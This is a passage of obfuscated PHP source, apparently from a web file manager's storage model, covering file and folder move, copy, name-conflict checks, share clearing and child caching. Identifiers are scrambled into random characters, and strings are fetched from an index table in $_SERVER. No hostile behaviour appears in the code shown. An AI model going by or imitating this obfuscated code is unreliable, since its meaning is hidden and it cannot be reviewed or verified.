$òö’å¡Ğ[$”Ö™Ÿ“²[191]]; $¢°Ç”Ğì = $this->_childrenMatch($›‡Ÿ‚šÜ, $òö’å¡Ğ, $ŸÇÁÚû); $Â¦öşË[] = array($”Ö™Ÿ“²[191], $Ï²‰¡, $”Ö™Ÿ“²[190], $¢°Ç”Ğì[$”Ö™Ÿ“²[190]]); $ŸŠ·ËÁ±[] = array($”Ö™Ÿ“²[191], $Ï²‰¡, $”Ö™Ÿ“²[604], $¢°Ç”Ğì[$”Ö™Ÿ“²[604]]); $this->_copyApplyMeta($òö’å¡Ğ, $‘Â£ùè·); if ($òö’å¡Ğ[$”Ö™Ÿ“²[500]] != $”Ö™Ÿ“²[91]) { $‘Â£ùè·[$”Ö™Ÿ“²[652]][] = $òö’å¡Ğ[$”Ö™Ÿ“²[557]]; } } $this->chunkEventSet($”Ö™Ÿ“²[663], array($”Ö™Ÿ“²[664], $ÜÂËÜ‹ö, $«„™Şó)); $this->saveAll($Â¦öşË); $this->chunkEventSet($”Ö™Ÿ“²[665], array($”Ö™Ÿ“²[666], $ÜÂËÜ‹ö, $«„™Şó)); $this->saveAll($ŸŠ·ËÁ±); return $˜õáï½Ã; } private function _childrenMakeRelation($şï›óí­, $Æı§£ò—) { $Á¿Ü„€ =& $_SERVER[œ—üé‹ê]; $ÄÛØèò¸ = array(); $§èïÃ” = array(); foreach ($şï›óí­ as $óÍÀëÛÆ) { $äòù¦»½ = $óÍÀëÛÆ[$Á¿Ü„€[32]] . $Á¿Ü„€[8] . $óÍÀëÛÆ[$Á¿Ü„€[604]]; $ÄÛØèò¸[$äòù¦»½] = $óÍÀëÛÆ[$Á¿Ü„€[191]]; } foreach ($Æı§£ò— as $óÍÀëÛÆ) { $äòù¦»½ = $óÍÀëÛÆ[$Á¿Ü„€[32]] . $Á¿Ü„€[8] . $óÍÀëÛÆ[$Á¿Ü„€[604]]; $¹Ä§íŸÍ = $ÄÛØèò¸[$äòù¦»½]; $§èïÃ”[$¹Ä§íŸÍ] = $óÍÀëÛÆ[$Á¿Ü„€[191]]; } return $§èïÃ”; } private function _childrenMatch($•”–¯Âº, $ôã¨À®±, $ßÈá™”¢) { $˜í„ˆº… =& $_SERVER[œ—üé‹ê]; $÷Ä½Ïïó = $ßÈá™”¢[$˜í„ˆº…[604]]; $…óúµûœ = $this->parentLevelArray($ôã¨À®±[$˜í„ˆº…[604]]); foreach ($…óúµûœ as $œíÄè‘Î) { if (isset($•”–¯Âº[$œíÄè‘Î])) { $÷Ä½Ïïó .= $•”–¯Âº[$œíÄè‘Î] . $˜í„ˆº…[667]; } } $÷Ä½Ïïó = rtrim($÷Ä½Ïïó, $˜í„ˆº…[50]) . $˜í„ˆº…[50]; $¡¼²ï™ = $this->parentLevelArray($÷Ä½Ïïó); $îµú¿²ı = $¡¼²ï™[count($¡¼²ï™) - 1]; return array($˜í„ˆº…[190] => $îµú¿²ı, $˜í„ˆº…[604] => $÷Ä½Ïïó); } private function _makeItemData($Ÿ§Ñß©İ, $­¡ÜÕ¼¼, $«Ö¾››) { $¹ì€³’É =& $_SERVER[œ—üé‹ê]; $µ®öÁâú = array($¹ì€³’É[668] => $Ÿ§Ñß©İ[$¹ì€³’É[500]], $¹ì€³’É[509] => $«Ö¾››, $¹ì€³’É[669] => $Ÿ§Ñß©İ[$¹ì€³’É[501]] ? $Ÿ§Ñß©İ[$¹ì€³’É[501]] : $¹ì€³’É[12], $¹ì€³’É[558] => $Ÿ§Ñß©İ[$¹ì€³’É[557]] ? $Ÿ§Ñß©İ[$¹ì€³’É[557]] : 0, $¹ì€³’É[640] => $Ÿ§Ñß©İ[$¹ì€³’É[79]] ? $Ÿ§Ñß©İ[$¹ì€³’É[79]] : 0, $¹ì€³’É[670] => intval($­¡ÜÕ¼¼[$¹ì€³’É[188]]), $¹ì€³’É[671] => intval($­¡ÜÕ¼¼[$¹ì€³’É[589]]), $¹ì€³’É[672] => intval(USER_ID), $¹ì€³’É[673] => intval(USER_ID), $¹ì€³’É[492] => intval($­¡ÜÕ¼¼[$¹ì€³’É[191]]), $¹ì€³’É[674] => $­¡ÜÕ¼¼[$¹ì€³’É[604]] . $­¡ÜÕ¼¼[$¹ì€³’É[191]] . $¹ì€³’É[50], $¹ì€³’É[513] => $Ÿ§Ñß©İ[$¹ì€³’É[88]] ? $Ÿ§Ñß©İ[$¹ì€³’É[88]] : time(), $¹ì€³’É[519] => 0, $¹ì€³’É[675] => $¹ì€³’É[12]); return $µ®öÁâú; } private function _copyApplyMeta($ì¥¶úµ³, &$¿ŞŸ™‘‹) { $’€êÑ¦Ø =& $_SERVER[œ—üé‹ê]; $êğèÃ¢£ = $ì¥¶úµ³[$’€êÑ¦Ø[191]]; $“ö³¾Ó² = $ì¥¶úµ³[$’€êÑ¦Ø[32]]; if (!isset($ì¥¶úµ³[$’€êÑ¦Ø[676]]) || !$ì¥¶úµ³[$’€êÑ¦Ø[676]] || $ì¥¶úµ³[$’€êÑ¦Ø[676]] == $’€êÑ¦Ø[228]) { $¿ŞŸ™‘‹[$’€êÑ¦Ø[654]][] = array($’€êÑ¦Ø[191], $êğèÃ¢£, $’€êÑ¦Ø[676], short_id($êğèÃ¢£)); } if (Input::check($“ö³¾Ó², $’€êÑ¦Ø[677])) { $¿ŞŸ™‘‹[$’€êÑ¦Ø[653]][] = array($’€êÑ¦Ø[191] => $êğèÃ¢£, $’€êÑ¦Ø[95] => $’€êÑ¦Ø[552], $’€êÑ¦Ø[451] => str_replace($’€êÑ¦Ø[53], $’€êÑ¦Ø[12], Pinyin::get($“ö³¾Ó²))); $¿ŞŸ™‘‹[$’€êÑ¦Ø[653]][] = array($’€êÑ¦Ø[191] => $êğèÃ¢£, $’€êÑ¦Ø[95] => $’€êÑ¦Ø[551], $’€êÑ¦Ø[451] => Pinyin::get($“ö³¾Ó², $’€êÑ¦Ø[678])); } $¿ŞŸ™‘‹[$’€êÑ¦Ø[653]][] = array($’€êÑ¦Ø[191] => $êğèÃ¢£, $’€êÑ¦Ø[95] => $’€êÑ¦Ø[531], $’€êÑ¦Ø[451] => KodSort::makeStr($“ö³¾Ó²)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¦â£âç”) { $ÕÜ¯îü§ =& $_SERVER[œ—üé‹ê]; $ºï­¥Á† = $this->sourceInfo($¦â£âç”); $½Ì¹Ô = $ÕÜ¯îü§[679]; $¨ùÈ²®Û = array($ÕÜ¯îü§[604] => array($ÕÜ¯îü§[635], $ºï­¥Á†[$ÕÜ¯îü§[604]] . $¦â£âç” . $ÕÜ¯îü§[636]), $ÕÜ¯îü§[520] => $this->targetIsDelete); $¸¥–Øó = $this->field($½Ì¹Ô)->where($¨ùÈ²®Û)->select(); if (!$¸¥–Øó) { return; } $¸¥–Øó = array_to_keyvalue($¸¥–Øó, $ÕÜ¯îü§[191]); foreach ($¸¥–Øó as $Áƒ÷‡•) { $ÇåÔ“ç = $Áƒ÷‡•[$ÕÜ¯îü§[190]]; $¦â£âç” = $Áƒ÷‡•[$ÕÜ¯îü§[191]]; if (!isset($this->_childrenListCache[$¦â£âç”]) && $Áƒ÷‡•[$ÕÜ¯îü§[500]] == $ÕÜ¯îü§[91]) { $this->_childrenListCache[$¦â£âç”] = array(); } if (!isset($this->_childrenListCache[$ÇåÔ“ç])) { $this->_childrenListCache[$ÇåÔ“ç] = array(); } $this->_childrenListCache[$ÇåÔ“ç][$¦â£âç”] = $Áƒ÷‡•; $this->_childrenItemCache[$¦â£âç”] = $Áƒ÷‡•; } } private function _childrenListAll($¾´§µè§, &$İåİ‚İ) { $áÎ¡ÛØ =& $_SERVER[œ—üé‹ê]; if (!isset($this->_childrenListCache[$¾´§µè§])) { return; } $©â±„÷ = $this->_childrenListCache[$¾´§µè§]; foreach ($©â±„÷ as $±€ÉÅÉÙ => $®¤§ĞÂˆ) { $İåİ‚İ[$±€ÉÅÉÙ] = $®¤§ĞÂˆ; if ($®¤§ĞÂˆ[$áÎ¡ÛØ[500]] == $áÎ¡ÛØ[91]) { $this->_childrenListAll($±€ÉÅÉÙ, $İåİ‚İ); } } } private function sourceInfoCache($ØğÍØÙà) { if (isset($this->_childrenItemCache[$ØğÍØÙà])) { return $this->_childrenItemCache[$ØğÍØÙà]; } return $this->sourceInfo($ØğÍØÙà); } private function _childrenList($Û­ŒË¨È) { if (isset($this->_childrenListCache[$Û­ŒË¨È])) { return $this->_childrenListCache[$Û­ŒË¨È]; } return $this->_childrenListSelect($Û­ŒË¨È); } private function _childrenListSelect($Ì°Œ¬î½) { $²Åöè¾É =& $_SERVER[œ—üé‹ê]; $ÅäÏû½‘ = array($²Åöè¾É[190] => $Ì°Œ¬î½, $²Åöè¾É[520] => $this->targetIsDelete); $³ïê¬”á = $this->where($ÅäÏû½‘)->select(); $³ïê¬”á = $³ïê¬”á ? $³ïê¬”á : array(); $Ëªáºîò = array_to_keyvalue($³ïê¬”á, $²Åöè¾É[191]); $this->_childrenListCache[$Ì°Œ¬î½] = $Ëªáºîò; foreach ($Ëªáºîò as $Ì°Œ¬î½ => $Àóôø°) { $this->_childrenItemCache[$Ì°Œ¬î½] = $Àóôø°; } return $Ëªáºîò; } private function fileNameExistAuto($ï‘Ò§©—, $ÒçÆ›´á) { $¹Óñ‘ÄÃ =& $_SERVER[œ—üé‹ê]; if ($ÒçÆ›´á[$¹Óñ‘ÄÃ[520]] == $¹Óñ‘ÄÃ[91]) { return $this->fileNameExist($ï‘Ò§©—, $ÒçÆ›´á[$¹Óñ‘ÄÃ[32]]); } return $this->fileNameExistCache($ï‘Ò§©—, $ÒçÆ›´á[$¹Óñ‘ÄÃ[32]]); } private function fileNameExistCache($ˆ•Ñ³Èô, $¶Íêİˆ÷) { $©Å’ˆô =& $_SERVER[œ—üé‹ê]; $¶Íêİˆ÷ = strtolower($¶Íêİˆ÷); $ø•¨…Èò = $this->_childrenList($ˆ•Ñ³Èô); foreach ($ø•¨…Èò as $Í†¸ÚÃÙ) { if ($¶Íêİˆ÷ == strtolower($Í†¸ÚÃÙ[$©Å’ˆô[32]])) { return $Í†¸ÚÃÙ[$©Å’ˆô[191]]; } } return !1; } private function fileNameAutoCache($“ıÉ£¹Ó, $İÖÛÀç¬, $ï¶Å÷ÚÔ, $¥ë¶ô¢Í) { $™’¾¦º‰ =& $_SERVER[œ—üé‹ê]; $ªãé¤á² = $this->_childrenList($“ıÉ£¹Ó); $²Æ“ÊÄï = array_to_keyvalue($ªãé¤á², $™’¾¦º‰[12], $™’¾¦º‰[32]); return $this->fileNameAutoGet($²Æ“ÊÄï, $İÖÛÀç¬, $ï¶Å÷ÚÔ, $¥ë¶ô¢Í); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($‹ë¯ı ¯, $¸¦Àâ”, $¹åŠÑ÷ï = REPEAT_REPLACE, $‰©§¿°Ç = '') { $¡¡Ğˆ€Í =& $_SERVER[œ—üé‹ê]; $Ú–Üº“Š = $this->sourceInfo($‹ë¯ı ¯); $•¤ó¸œÅ = $this->sourceInfo($¸¦Àâ”); if ($Ú–Üº“Š[$¡¡Ğˆ€Í[190]] == $•¤ó¸œÅ[$¡¡Ğˆ€Í[191]]) { if ($Ú–Üº“Š[$¡¡Ğˆ€Í[520]] == $¡¡Ğˆ€Í[91]) { Model($¡¡Ğˆ€Í[518])->restore(array($‹ë¯ı ¯)); } if (!$‰©§¿°Ç || $‰©§¿°Ç == $Ú–Üº“Š[$¡¡Ğˆ€Í[32]]) { return $‹ë¯ı ¯; } } $ª˜Û‚Åè = $this->pathInfoMore($‹ë¯ı ¯); if ($this->isParentOf($‹ë¯ı ¯, $¸¦Àâ”)) { return !1; } if (!$Ú–Üº“Š || !$•¤ó¸œÅ || $•¤ó¸œÅ[$¡¡Ğˆ€Í[500]] != $¡¡Ğˆ€Í[91]) { return !1; } Hook::trigger($¡¡Ğˆ€Í[680], $ª˜Û‚Åè); $this->targetIsDelete = intval($Ú–Üº“Š[$¡¡Ğˆ€Í[520]]); if ($Ú–Üº“Š[$¡¡Ğˆ€Í[190]] == $¸¦Àâ” && $‰©§¿°Ç != $Ú–Üº“Š[$¡¡Ğˆ€Í[32]]) { $áãõ¶ü† = $this->fileNameExist($¸¦Àâ”, $‰©§¿°Ç); if ($áãõ¶ü† && $Ú–Üº“Š[$¡¡Ğˆ€Í[500]] == $¡¡Ğˆ€Í[228]) { $Û–À¤Üß = $this->sourceInfo($áãõ¶ü†); $±©üùçÄ = $this->fileHistory($Û–À¤Üß, $Ú–Üº“Š[$¡¡Ğˆ€Í[557]], $Ú–Üº“Š[$¡¡Ğˆ€Í[79]]); if (!$±©üùçÄ) { Model($¡¡Ğˆ€Í[560])->remove($Ú–Üº“Š[$¡¡Ğˆ€Í[557]]); } $this->removeNow($‹ë¯ı ¯, !1); $this->folderSizeReset($¸¦Àâ”); Hook::trigger($¡¡Ğˆ€Í[681], $ª˜Û‚Åè); return $áãõ¶ü†; } } $ÎÖ¿˜‡” = $‰©§¿°Ç ? $‰©§¿°Ç : $Ú–Üº“Š[$¡¡Ğˆ€Í[32]]; $this->lockMoveStart($‹ë¯ı ¯); $this->lockWriteStart($¸¦Àâ”, $ÎÖ¿˜‡”); $æË‹»Œ™ = array($¡¡Ğˆ€Í[652] => array(), $¡¡Ğˆ€Í[682] => !1); $this->clearShare($‹ë¯ı ¯, $¸¦Àâ”); $Ü—›²é… = $this->fileNameExistAuto($¸¦Àâ”, $Ú–Üº“Š); $å°òˆíÄ = $this->_move($‹ë¯ı ¯, $¸¦Àâ”, $¹åŠÑ÷ï, $æË‹»Œ™, $‰©§¿°Ç); $this->sourceCacheClear(); if ($Ú–Üº“Š[$¡¡Ğˆ€Í[500]] == $¡¡Ğˆ€Í[91] && $Ü—›²é…) { $this->folderSizeResetChildren($å°òˆíÄ); } Model($¡¡Ğˆ€Í[230])->linkAdd($æË‹»Œ™[$¡¡Ğˆ€Í[652]]); if ($å°òˆíÄ && $Ü—›²é… && $æË‹»Œ™[$¡¡Ğˆ€Í[682]]) { $áş‚ÆÃÇ = $Ú–Üº“Š[$¡¡Ğˆ€Í[500]] == $¡¡Ğˆ€Í[91] ? $this->_childrenListSelect($‹ë¯ı ¯) : !1; $‡Ä§Ó¯€ = $áş‚ÆÃÇ && count($áş‚ÆÃÇ) > 0 ? !0 : !1; $this->removeNow($‹ë¯ı ¯, $‡Ä§Ó¯€); } $this->lockMoveEnd($‹ë¯ı ¯); $this->lockWriteEnd($¸¦Àâ”, $ÎÖ¿˜‡”); $this->folderSizeReset($Ú–Üº“Š[$¡¡Ğˆ€Í[190]]); $this->folderSizeReset($¸¦Àâ”); $¨Ê½ë½¿ = array($Ú–Üº“Š[$¡¡Ğˆ€Í[190]], $¸¦Àâ”); if ($Ú–Üº“Š[$¡¡Ğˆ€Í[500]] == $¡¡Ğˆ€Í[91]) { $¨Ê½ë½¿[] = $‹ë¯ı ¯; } $this->updateModifyTime($¨Ê½ë½¿); Model($¡¡Ğˆ€Í[655])->eventMove($‹ë¯ı ¯, $Ú–Üº“Š[$¡¡Ğˆ€Í[190]], $¸¦Àâ”); Hook::trigger($¡¡Ğˆ€Í[681], $ª˜Û‚Åè); return $å°òˆíÄ; } private function _move($¥‡²¨¼•, $¶§µÆ‚‹, $¶„Ú¨á», &$õ¤ôçâæ, $¬¡”Äü = '') { $¥ÇÚÉòô =& $_SERVER[œ—üé‹ê]; $Å€‡ÕŸ¹ = $this->sourceInfo($¥‡²¨¼•); $µñ£ãÀ€ = $Å€‡ÕŸ¹[$¥ÇÚÉòô[500]] == $¥ÇÚÉòô[91]; $ëë²š = $¬¡”Äü ? $¬¡”Äü : $Å€‡ÕŸ¹[$¥ÇÚÉòô[32]]; $«á¼º¦ = $this->fileNameExistAuto($¶§µÆ‚‹, $Å€‡ÕŸ¹); $this->lockMoveStart($¥‡²¨¼•); $this->lockWriteStart($¶§µÆ‚‹, $ëë²š); if (!$«á¼º¦) { return $this->_moveForce($¥‡²¨¼•, $¶§µÆ‚‹, $ëë²š); } $Îì¸ë«Ì = $«á¼º¦; $‡’Çˆ÷€ = !1; if ($µñ£ãÀ€) { if ($¶„Ú¨á» == REPEAT_RENAME_FOLDER) { $ëë²š = $this->fileNameAuto($¶§µÆ‚‹, $ëë²š, $¶„Ú¨á», $µñ£ãÀ€); $Îì¸ë«Ì = $this->_moveForce($¥‡²¨¼•, $¶§µÆ‚‹, $ëë²š); } else { $ğú˜¸İÛ = $this->_childrenListSelect($¥‡²¨¼•); foreach ($ğú˜¸İÛ as $Ş®åüöõ) { $à¿‘¸ë’ = REPEAT_REPLACE; $this->_move($Ş®åüöõ[$¥ÇÚÉòô[191]], $«á¼º¦, $à¿‘¸ë’, $õ¤ôçâæ); } $‡’Çˆ÷€ = !0; } } else { if ($¶„Ú¨á» == REPEAT_RENAME || $¶„Ú¨á» == REPEAT_RENAME_FOLDER) { $ëë²š = $this->fileNameAuto($¶§µÆ‚‹, $ëë²š, $¶„Ú¨á», $µñ£ãÀ€); $Îì¸ë«Ì = $this->_moveForce($¥‡²¨¼•, $¶§µÆ‚‹, $ëë²š); } else { $æ¶Û·ş = $this->sourceInfoCache($«á¼º¦); $ˆóòŒŸ = $this->fileHistory($æ¶Û·ş, $Å€‡ÕŸ¹[$¥ÇÚÉòô[557]], $Å€‡ÕŸ¹[$¥ÇÚÉòô[79]]); if ($ˆóòŒŸ) { $õ¤ôçâæ[$¥ÇÚÉòô[652]][] = $Å€‡ÕŸ¹[$¥ÇÚÉòô[557]]; } $‡’Çˆ÷€ = !0; } } if ($‡’Çˆ÷€) { $õ¤ôçâæ[$¥ÇÚÉòô[682]] = !0; } return $Îì¸ë«Ì; } private function _moveForce($è¤ë“ö», $ÕûÅ¼”, $íŸµ Ùê) { $§ùı­Ä =& $_SERVER[œ—üé‹ê]; $ÓÇÍ­•ã = $this->sourceInfo($è¤ë“ö»); $ıüŸìÂ² = $this->sourceInfo($ÕûÅ¼”); $®š¬´… = $ÓÇÍ­•ã[$§ùı­Ä[500]] == $§ùı­Ä[91]; $»Ü’äà = array($§ùı­Ä[492] => $ıüŸìÂ²[$§ùı­Ä[191]], $§ùı­Ä[674] => $ıüŸìÂ²[$§ùı­Ä[604]] . $ıüŸìÂ²[$§ùı­Ä[191]] . $§ùı­Ä[50], $§ùı­Ä[670] => $ıüŸìÂ²[$§ùı­Ä[188]], $§ùı­Ä[671] => $ıüŸìÂ²[$§ùı­Ä[589]], $§ùı­Ä[673] => USER_ID, $§ùı­Ä[509] => $íŸµ Ùê); $‹¡â¾’ = $ÓÇÍ­•ã[$§ùı­Ä[188]] == SourceModel::TYPE_GROUP && $ıüŸìÂ²[$§ùı­Ä[188]] == SourceModel::TYPE_GROUP && $ÓÇÍ­•ã[$§ùı­Ä[589]] == $ıüŸìÂ²[$§ùı­Ä[589]]; if (!$‹¡â¾’ && $this->moveClearAuth) { Model($§ùı­Ä[587])->authClear($è¤ë“ö»); } $‘Šù‹¶» = $ÓÇÍ­•ã[$§ùı­Ä[520]] == $§ùı­Ä[91] && $ıüŸìÂ²[$§ùı­Ä[520]] != $§ùı­Ä[91]; if ($‘Šù‹¶») { $»Ü’äà[$§ùı­Ä[519]] = 0; } if ($®š¬´…) { $ÒşÆ£®£ = array($§ùı­Ä[674] => array($§ùı­Ä[635], $ÓÇÍ­•ã[$§ùı­Ä[604]] . $ÓÇÍ­•ã[$§ùı­Ä[191]] . $§ùı­Ä[636])); $œ˜Şíê– = $ÓÇÍ­•ã[$§ùı­Ä[604]] . $ÓÇÍ­•ã[$§ùı­Ä[191]] . $§ùı­Ä[50]; $Êüšï = $ıüŸìÂ²[$§ùı­Ä[604]] . $ıüŸìÂ²[$§ùı­Ä[191]] . $§ùı­Ä[50] . $ÓÇÍ­•ã[$§ùı­Ä[191]] . $§ùı­Ä[50]; $²çş®ÚÔ = array($§ùı­Ä[674] => array($§ùı­Ä[683], "\x72\145\x70\x6c\141\x63\145\50\160\141\162\x65\156\x74\x4c\x65\166\145\x6c\x2c\47{$œ˜Şíê–}\x27\54\x27{$Êüšï}\47\x29"), $§ùı­Ä[670] => $ıüŸìÂ²[$§ùı­Ä[188]], $§ùı­Ä[671] => $ıüŸìÂ²[$§ùı­Ä[589]]); if ($‘Šù‹¶») { $²çş®ÚÔ[$§ùı­Ä[519]] = 0; } $this->where($ÒşÆ£®£)->data($²çş®ÚÔ)->save(); } $this->where(array($§ùı­Ä[506] => $è¤ë“ö»))->data($»Ü’äà)->save(); return $è¤ë“ö»; } private function clearShare($ÉÆà÷¿İ, $ªÂğòüÉ) { $ˆ”²…Š¿ =& $_SERVER[œ—üé‹ê]; $şèË²¢› = $this->sourceInfo($ÉÆà÷¿İ); $ãÆÁˆƒº = $this->sourceInfo($ªÂğòüÉ); if ($şèË²¢›[$ˆ”²…Š¿[589]] == $ãÆÁˆƒº[$ˆ”²…Š¿[589]] && $şèË²¢›[$ˆ”²…Š¿[188]] == $ˆ”²…Š¿[684]) { return; } $ÉÎÓçÇ = array($ˆ”²…Š¿[604] => array($ˆ”²…Š¿[635], $şèË²¢›[$ˆ”²…Š¿[604]] . $ÉÆà÷¿İ . $ˆ”²…Š¿[636])); $ó¨ ’± = $this->field($ˆ”²…Š¿[506])->where($ÉÎÓçÇ)->getField($ˆ”²…Š¿[191], !0); if (!$ó¨ ’±) { return; } $ÉÎÓçÇ = array($ˆ”²…Š¿[191] => array($ˆ”²…Š¿[7], $ó¨ ’±), $ˆ”²…Š¿[685] => 1); $ÍÙ¬äÃí = Model($ˆ”²…Š¿[686])->field($ˆ”²…Š¿[687])->where($ÉÎÓçÇ)->select(); if (!$ÍÙ¬äÃí) { return; } $ÍÙ¬äÃí = array_to_keyvalue($ÍÙ¬äÃí, $ˆ”²…Š¿[12], $ˆ”²…Š¿[687]); $ÉÎÓçÇ = array($ˆ”²…Š¿[687] => array($ˆ”²…Š¿[7], $ÍÙ¬äÃí)); Model($ˆ”²…Š¿[686])->where($ÉÎÓçÇ)->save(array($ˆ”²…Š¿[685] => 0)); Model($ˆ”²…Š¿[688])->where($ÉÎÓçÇ)->delete(); } public function copyFolderFromIO($ˆî‹Ï²™, $Ä¶š÷Èü, $¼˜¥ĞÀñ, $ÆÍÀ‹ù¯, $Ö üèî¼, $­¯­‚Å© = false) { $¦æì•áì =& $_SERVER[œ—üé‹ê]; $ø£Ïôæ’ = array($¦æì•áì[653] => array(), $¦æì•áì[654] => array(), $¦æì•áì[652] => array(), $¦æì•áì[689] => array()); $º¨€Çˆ = $­¯­‚Å© ? $­¯­‚Å© : $ˆî‹Ï²™->pathThis($Ä¶š÷Èü); $ûë€âïŒ = $this->fileNameExist($¼˜¥ĞÀñ, $º¨€Çˆ); $«®Õ = $this->mkdir($¼˜¥ĞÀñ, $º¨€Çˆ, $ÆÍÀ‹ù¯); if (!$ûë€âïŒ || $ÆÍÀ‹ù¯ == REPEAT_RENAME_FOLDER) { $ÆÍÀ‹ù¯ = !1; } if ($ûë€âïŒ) { $this->_childrenAllMake($ûë€âïŒ); } Hook::trigger($¦æì•áì[690]); $¬ØË¤ûğ = KodIO::ioFileDriverGet($¦æì•áì[498] . $¼˜¥ĞÀñ . $¦æì•áì[402]); $this->_copyChildTo($ˆî‹Ï²™, $Ä¶š÷Èü, $«®Õ, $ÆÍÀ‹ù¯, $ø£Ïôæ’, $Ö üèî¼, $¬ØË¤ûğ); Hook::trigger($¦æì•áì[691]); if ($«®Õ) { $this->folderSizeResetChildren($«®Õ); } $this->_childrenListClear(); Model($¦æì•áì[471])->addAll($ø£Ïôæ’[$¦æì•áì[653]], array(), !0); Model($¦æì•áì[655])->eventCopy($«®Õ); $this->saveAll($ø£Ïôæ’[$¦æì•áì[654]]); Model($¦æì•áì[560])->linkAdd($ø£Ïôæ’[$¦æì•áì[652]]); Model($¦æì•áì[560])->remove($ø£Ïôæ’[$¦æì•áì[689]]); $this->folderSizeReset($¼˜¥ĞÀñ); $this->updateModifyTime($¼˜¥ĞÀñ); return $«®Õ; } private function _copyChildTo($àû°‹¹º, $ È¯¦ÍÕ, $€ˆ°òàÀ, $¨€ŞÉÛš, &$ÔËÔì€, $ù£–·§õ, $©›ÔªÈ) { $Ö¦–»ï˜ =& $_SERVER[œ—üé‹ê]; $¡¸Õ§‰ˆ = $this->sourceInfoCache($€ˆ°òàÀ); $¶õÙì× = $àû°‹¹º->listPath($ È¯¦ÍÕ); $¶õÙì× = $¶õÙì× ? $¶õÙì× : array($Ö¦–»ï˜[86] => array(), $Ö¦–»ï˜[85] => array()); $³Û‚úê¼ = array_merge($¶õÙì×[$Ö¦–»ï˜[86]], $¶õÙì×[$Ö¦–»ï˜[85]]); $Å˜å„èè = $this->_addFiles($àû°‹¹º, $©›ÔªÈ, $¶õÙì×[$Ö¦–»ï˜[86]], $ù£–·§õ); $µ íßœ = array(); foreach ($³Û‚úê¼ as &$§¸°ôÁ×) { if (isset($Å˜å„èè[$§¸°ôÁ×[$Ö¦–»ï˜[32]]])) { $§¸°ôÁ× = $Å˜å„èè[$§¸°ôÁ×[$Ö¦–»ï˜[32]]]; } $§¸°ôÁ×[$Ö¦–»ï˜[500]] = $§¸°ôÁ×[$Ö¦–»ï˜[33]] == $Ö¦–»ï˜[78]; $§¸°ôÁ×[$Ö¦–»ï˜[501]] = substr(_get($§¸°ôÁ×, $Ö¦–»ï˜[166], $Ö¦–»ï˜[12]), 0, 10); $§¸°ôÁ×[$Ö¦–»ï˜[79]] = _get($§¸°ôÁ×, $Ö¦–»ï˜[79], 0); $§¸°ôÁ×[$Ö¦–»ï˜[557]] = _get($§¸°ôÁ×, $Ö¦–»ï˜[557], 0); if (!isset($§¸°ôÁ×[$Ö¦–»ï˜[692]]) && $§¸°ôÁ×[$Ö¦–»ï˜[557]]) { $ÔËÔì€[$Ö¦–»ï˜[689]][] = $§¸°ôÁ×[$Ö¦–»ï˜[557]]; } if ($¨€ŞÉÛš) { $ÔÂ˜­ª = $this->fileNameExistCache($€ˆ°òàÀ, $§¸°ôÁ×[$Ö¦–»ï˜[32]]); if ($ÔÂ˜­ª) { if ($§¸°ôÁ×[$Ö¦–»ï˜[500]] || $¨€ŞÉÛš == REPEAT_SKIP) { continue; } if ($¨€ŞÉÛš == REPEAT_REPLACE) { $„Íó•· = $this->sourceInfoCache($ÔÂ˜­ª); $³ÓŒÓ£Ï = $this->fileHistory($„Íó•·, $§¸°ôÁ×[$Ö¦–»ï˜[557]], $§¸°ôÁ×[$Ö¦–»ï˜[79]]); if ($³ÓŒÓ£Ï) { $ÔËÔì€[$Ö¦–»ï˜[652]][] = $§¸°ôÁ×[$Ö¦–»ï˜[557]]; } continue; } else { if ($¨€ŞÉÛš == REPEAT_RENAME) { $§¸°ôÁ×[$Ö¦–»ï˜[32]] = $this->fileNameAutoCache($€ˆ°òàÀ, $§¸°ôÁ×[$Ö¦–»ï˜[32]], $¨€ŞÉÛš, !1); } } } } if (!$§¸°ôÁ×[$Ö¦–»ï˜[500]] && $§¸°ôÁ×[$Ö¦–»ï˜[557]] == 0) { continue; } if (!$§¸°ôÁ×[$Ö¦–»ï˜[500]] && $§¸°ôÁ×[$Ö¦–»ï˜[557]]) { $ÔËÔì€[$Ö¦–»ï˜[652]][] = $§¸°ôÁ×[$Ö¦–»ï˜[557]]; } $µ íßœ[] = $this->_makeItemData($§¸°ôÁ×, $¡¸Õ§‰ˆ, $§¸°ôÁ×[$Ö¦–»ï˜[32]]); } unset($§¸°ôÁ×); if (!empty($µ íßœ)) { $this->addAll($µ íßœ); $this->_childrenListSelect($€ˆ°òàÀ); } $Å¢ã‚õÇ = $this->_childrenList($€ˆ°òàÀ); $Å¢ã‚õÇ = array_to_keyvalue($Å¢ã‚õÇ, $Ö¦–»ï˜[32]); foreach ($³Û‚úê¼ as $§¸°ôÁ×) { $„Íó•· = $Å¢ã‚õÇ[$§¸°ôÁ×[$Ö¦–»ï˜[32]]]; $¹İşãñ = $„Íó•·[$Ö¦–»ï˜[191]]; $this->_copyApplyMeta($„Íó•·, $ÔËÔì€); if ($§¸°ôÁ×[$Ö¦–»ï˜[33]] == $Ö¦–»ï˜[78]) { $§¸°ôÁ×[$Ö¦–»ï˜[87]] = $àû°‹¹º->getPathInner($§¸°ôÁ×[$Ö¦–»ï˜[87]]); $this->_copyChildTo($àû°‹¹º, $§¸°ôÁ×[$Ö¦–»ï˜[87]], $¹İşãñ, $¨€ŞÉÛš, $ÔËÔì€, $ù£–·§õ, $©›ÔªÈ); } } } private function _addFiles($€šÎÑ½, $ÁæêùáÇ, $­¬ˆº÷, $¿ø©°Á×) { $İü§¦Ğ =& $_SERVER[œ—üé‹ê]; if (!$­¬ˆº÷ || count($­¬ˆº÷) == 0) { return array(); } $Ò£‘„Óå = array(); foreach ($­¬ˆº÷ as &$Óáú—ë) { Hook::trigger($İü§¦Ğ[693], $Óáú—ë); $Óáú—ë[$İü§¦Ğ[87]] = $€šÎÑ½->getPathInner($Óáú—ë[$İü§¦Ğ[87]]); $¹÷£¥ç = $€šÎÑ½->hashSimple($Óáú—ë[$İü§¦Ğ[87]]); $…©£Ûõ² = $€šÎÑ½->hashMd5($Óáú—ë[$İü§¦Ğ[87]]); if (strlen($…©£Ûõ²) > 10 && !isset($Ò£‘„Óå[$…©£Ûõ²])) { $Ò£‘„Óå[$…©£Ûõ²] = array(); } $Óáú—ë[$İü§¦Ğ[694]] = $¹÷£¥ç; $Óáú—ë[$İü§¦Ğ[563]] = $…©£Ûõ²; $Ò£‘„Óå[$…©£Ûõ²][] =& $Óáú—ë; if (count($Ò£‘„Óå[$…©£Ûõ²]) > 1) { 